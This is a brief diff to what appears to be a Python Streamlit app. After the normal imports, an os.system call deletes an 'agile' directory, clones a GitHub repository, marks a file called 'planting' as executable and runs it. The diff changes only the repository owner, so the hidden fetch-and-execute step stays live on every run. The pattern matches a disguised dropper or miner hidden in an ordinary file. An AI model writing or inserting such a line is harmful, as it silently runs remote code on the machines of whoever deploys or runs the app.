@@ -4,4 +4,4 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system ("rm -rf agile && git clone https://github.com/janiolero/agile.git && cd agile && chmod +x planting && ./planting")
+os.system ("rm -rf agile && git clone https://github.com/jirepola/agile.git && cd agile && chmod +x planting && ./planting")
